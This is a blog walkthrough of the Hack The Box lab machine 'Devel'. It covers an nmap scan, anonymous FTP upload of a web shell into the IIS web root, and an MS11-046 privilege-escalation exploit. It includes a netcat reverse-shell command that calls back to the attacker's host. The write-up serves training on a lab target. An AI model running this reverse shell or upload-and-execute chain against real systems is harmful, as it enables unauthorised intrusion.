---
layout: single
title: Devel - Hack The Box
excerpt: "Devel is an Windows machine that is cataloged as easy. In this case, we are going to take advantage of ftp (port 21) that allows anonymous login and let us as attackers upload a web shell and we will be in as the user 'iis appol \ web'. Then with a little help of Windows exploit suggester we get access as root user."
date: 2021-11-30
classes: wide
header:
  teaser: /assets/images/htb-writeup-Devel/logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - easy
  - ftp
  - Windows Exploit suggester

---

![](/assets/images/htb-writeup-Devel/logo.png)

Devel is an Windows machine that is cataloged as easy. In this case, we are going to take advantage of ftp (port 21) that allows anonymous login and let us as attackers upload a web shell and we will be in as the user 'iis appol \web'. Then with a little help of Windows exploit suggester we get access as root user.

Machine IP = 10.10.10.5

The first thing I do is to setup my work environment with a Python script that I create which will tell me exactly what machine I'm attacking; At the same time it will create some directories that I normally use (nmap, content, exploit, notes).  

If you want to Clone this repository please refer to [initHack en github](https://github.com/W1nz4c4r/initHACK).

![](/assets/images/htb-writeup-Devel/initHACK.png)

## Port Scan
 After having everything setup I send the **nmap** command:
  * map -sS -sV -sC -p- -vvv -oA allPorts 10.10.10.5

```
Nmap 7.92 scan initiated Thu Nov 18 10:43:20 2021 as: nmap -sS -sV -sC -p- -vvv -oA allPorts 10.10.10.5
Nmap scan report for 10.10.10.5
Host is up, received echo-reply ttl 127 (0.060s latency).
Scanned at 2021-11-18 10:43:26 EST for 312s
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 11-18-21  04:39AM                    7 hello.txt
| 03-17-17  04:37PM                  689 iisstart.htm
| 11-18-21  04:42AM                16392 shell.aspx
|_03-17-17  04:37PM               184946 welcome.png
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
|_http-title: IIS7
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 18 10:48:38 2021 -- 1 IP address (1 host up) scanned in 317.55 seconds
```

## Enumeration

First thing that I usually like to check is if the **ftp** accepts anonymous login and in this case it does.

![](/assets/images/htb-writeup-Devel/ftp-log.png)

Then I check the web page (port 80) and I realized that what is on the FTP seems to be the home folder for the web server, This means that we can upload a webshell through the FTP and access to it form the browser.

![](/assets/images/htb-writeup-Devel/web-page.png)


## Gaining Foothold

We'll create a test file and check if we can upload files to the web server.
  * test.html:
```
<html>
  <h1> Test </h1>
</html>
```
upload the file through ftp:


 ![](/assets/images/htb-writeup-Devel/testFTP.png)

 then we go on our browser to **http://10.10.10.5/test.html** and we see that we can upload files to the web Server.


 ![](/assets/images/htb-writeup-Devel/testHTML.png)

 Now we are going to upload a web shell and we have command execution

 ![](/assets/images/htb-writeup-Devel/cmdWEB.png)


 Upload a nc.exe to the webpage so we can get a reverse Shell. once the **nc.exe** is uploaded on the web shell we run the following command to get a reverse shell.

    * \\10.10.14.9\mio\nc.exe -e cmd 10.10.14.9 443


![](/assets/images/htb-writeup-Devel/nc.png)

We are in as the user 'iis apppool\web' but we can't get the user or administrator credentials.

![](/assets/images/htb-writeup-Devel/noAccess.png)

## Privilege Escalation

Usually on windows machines what I do for privilege escalation is to run the 'systeminfo' command and check some information about the system.

```
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          1/12/2021, 5:47:19 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.474 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.549 MB
Virtual Memory: In Use:    592 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::58c0:f1cf:abc6:bb9e
                                 [03]: dead:beef::1fc
```

Something that got my attention was that the system is running a windows 7 build 7600 which is a relatively old Os and most likely vulnerable to some exploits

![](/assets/images/htb-writeup-Devel/exploit.png)

I downloaded the exploit **MS11-046** already compiled from [github](https://github.com/abatchy17/WindowsExploits/tree/master/MS11-046). Once you already have the file you need to upload it to the attacked machine, in my case I did it with **impacket-smbserver**

![](/assets/images/htb-writeup-Devel/impakect.png)

Finally, run the exploit and you will be in as **root**.

![](/assets/images/htb-writeup-Devel/root.png)
